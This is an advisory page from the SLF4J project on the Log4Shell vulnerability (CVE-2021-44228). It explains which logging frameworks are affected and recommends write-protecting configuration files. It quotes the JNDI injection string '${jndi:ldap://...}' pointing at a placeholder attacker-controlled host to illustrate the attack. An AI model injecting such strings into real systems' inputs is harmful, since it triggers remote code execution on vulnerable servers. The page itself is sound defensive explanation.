<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="content-type" content="text/html; charset=iso-8859-1" />
    <title>SLF4J</title>
    <link rel="stylesheet" type="text/css" media="screen" href="css/site.css" />
  </head>
  <body onload="prettyPrint(); decorate();">
    <script type="text/javascript">prefix='';</script>
    <script type="text/javascript" src="js/prettify.js"></script>
    <script type="text/javascript" src="js/jquery-min.js"></script>
    <script type="text/javascript" src="js/decorator.js"></script>

    <div id="container">

       <script src="templates/header.js" type="text/javascript"></script>

   
      <div id="left">
        <noscript>Please turn on Javascript to view this menu</noscript>
        <script src="templates/left.js" type="text/javascript"></script>
      </div>
      <div id="right">
        <script src="templates/right.js" type="text/javascript"></script>
      </div>
      
      <div id="content">

      <h1>Comments on the CVE-2021-44228 vulnerability</h1>

      <h3>Preamble</h3>
      
      <p>The JNDI/LDAP/RMI/X serialization rabbit hole goes deep and
      leads to much uncertainty. <b>Thus, the contents of this page
      are the result of our current knowledge and are provided AS IS
      without warranty of any kind.</b></p>

      <h3>What is CVE-2021-44228?</h3>
      
      <p>CVE-2021-44228 is a vulnerability classified under the
      highest severity mark, i.e. 10 out of 10. It allows an attacker
      to execute arbitrary code by injecting attacker-controlled data
      into a logged message. As far as vulnerabilities are concerned,
      CVE-2021-44228 is probably as bad as it gets.
      </p>

      <p>Superlatives aside, it is important to understand the <a
      href="https://www.lunasec.io/docs/blog/log4j-zero-day/">mechanics
      of the vulnerability</a>. The exploit becomes effective when the
      attacker can inject a string containing a substring in the form
      "&dollar;&lbrace;jndi:ldap://some.attacker-controlled.site/&rbrace;".
      Opportunities for injecting such strings appear to be endless.
      </p>

      <p>Log4j 2.x is open for this attack because it performs a
      lookup, aka string substitution, using the JNDI protocol,
      whenever the "&dollar;&lbrace;jndi:...&rbrace;" string is found
      within a message parameter. As mentioned above, the contents of
      the message parameter can be injected quite easily by the
      attacker.</p>

      <h3>Is log4j 1.x vulnerable?</h3>

      <p class="highlight">As log4j 1.x does <span class="big
      green">NOT</span> offer a JNDI look-up mechanism at the message
      level, it does <span class="big green">NOT</span> suffer from
      CVE-2021-44228. </p>

      <p>Given that log4j version 1.x is still very widely deployed,
      perhaps 10 times more than log4j 2.x, we have been receiving a
      steady stream of questions regarding the vulnerability of log4j
      version 1.x.
      </p>

      <p><b>As log4j 1.x does <span class="big green">NOT</span> offer
      a JNDI look up mechanism at the message level, it does <span
      class="big green">NOT</span> suffer from CVE-2021-44228.</b></p>

      <p>However, log4j 1.x comes with <code>JMSAppender</code> which
      will perform a JNDI lookup if enabled in log4j's configuration
      file, i.e. <em>log4j.properties</em> or
      <em>log4j.xml</em>. Thus, an attacker who has write access to an
      application's log4j configuration file can perform an RCE attack
      whenever log4j 1.x reads a corrupt/malicious configuration
      file. More on this <a href="#concreteMeasures"> below</a>.</p>

      <h3>How about the SLF4J API?</h3>
     
      <p>The SLF4J API is just an API which lets message data go
      through. As such, using log4j 2.x, even via SLF4J does not
      mitigate the vulnerability.
      </p>

      <p>However, as mentioned previously, log4j 1.x is safe with
      respect to CVE-2021-44228. Thus, if your SLF4J provider/binding
      is <em>slf4j-logj12.jar</em>, you are safe regarding
      CVE-2021-44228.</p>

      <p>If you are using <em>log4j-over-slf4j.jar</em> with SLF4J
      API, you are safe unless the underlying implementation is log4j
      2.x.</p>
      
      <h3>Does a similar vulnerability exist in logback?</h3>

      <p>Logback does <span class="big green">NOT</span> offer a
      lookup mechanism at the message level. Thus, it is deemed safe
      with respect to CVE-2021-44228. However, we are still looking at
      other possible vulnerabilities of <a span="big green">lesser</a>
      severity. Indeed, the JNDI/RMI/LDAP serialization
      vulnerabilities are a true minefield. </p>

      <h3 class="doAnchor" name="concreteMeasures">Concrete protective
      measure: write protect log4j{1,2}/logback configuration
      files</h3>

      <p>While there are obviously differences between JNDI/LDAP/RMI
      serialization attacks, from an abstract point of view, they are
      all related to serialization, the gift that never seems to stop
      giving.</p>
      
      <p>At this point, we hope that you appreciate the distinction
      between serialization attacks where the injection of malicious
      input is performed at the level of 1) log message data 2)
      configuration file. The point of injection matters, a lot. If
      you understand the difference, please read on.</p>
      
      <p>While log4j 1.x is old, it is still very extensible. So are
      logback and log4j 2.x. </p>

      <p>What if there exist other vulnerable extension points, in any
      of the aforementioned logging frameworks, that we do not know
      about?  Do you think you can enumerate these weak points by
      searching a CVE database?</p>

      <p>Trying to harden <code>JMSAppender</code> in log4j 1.x or
      some other component in log4j 2.x or logback against
      serialization injection seems like a half-measure. If you are
      fond of analogies, it is a bit like trying to empty a bathtub
      with a leaky faucet armed only with a spoon.
      </p>
      
      <p>Therefore, in addition to hardening KNOWN vulnerable
      components in aforementioned frameworks, we also recommend that
      configuration files be protected against write access. In
      Unix-speak they should be read-only for all users, including the
      <code>owner</code>. If possible, they should also be monitored
      against changes and unauthorized manipulation.</p>

      <p>If you have read this far, you might also get an "Aha but
      wait!" moment related to serialization attacks but having
      nothing to do with logging.</p>
      
      <h3>Is there a bigger lesson?</h3>

      <p>CVE-2021-44228 involves a cascade of failures in various
      components, of which only one is actually located in log4j
      2.x. Indeed, it takes only a moment of inattention to
      unwittingly create a vulnerability. However, vulnerabilities may
      arise even when you follow best practices.
      </p>

      <p>Thus, while keeping up with the latest patches is a good
      practice, it is probably just as important to invest resources
      so that your organization is capable of understanding the actual
      root causes of vulnerabilities and avoid them in the first
      place. </p>

      <p>Another question is the reaction speed. Once a vulnerability
      is detected, can your organization fix a vulnerability quickly?
      On this front, log4j 2.x developers deserve credit for their
      quick response.
      </p>

      <h3>Conclusion</h3>

      <p>CVE-2021-44228 became public knowledge in 2021-12-10, about
      48 hours ago. It raises a number of very tough questions which
      are not necessarily related to logging. As mentioned at the top
      of this page, the JNDI serialization rabbit hole goes deep and
      leads to much uncertainty. We are still investigating.</p>
            
      <h3>Further reading</h3>
      
      <ol>
        <li><a
        href="https://www.lunasec.io/docs/blog/log4j-zero-day/">Log4Shell:
        RCE 0-day exploit found in log4j2, a popular Java logging
        package</a></li>

        <li><a
        href="https://github.com/lunasec-io/lunasec/blob/master/docs/blog/2021-12-09-log4j-zero-day.md">lunasec-io/lunasec</a></li>

      </ol>
    </div>
  </body>
</html>
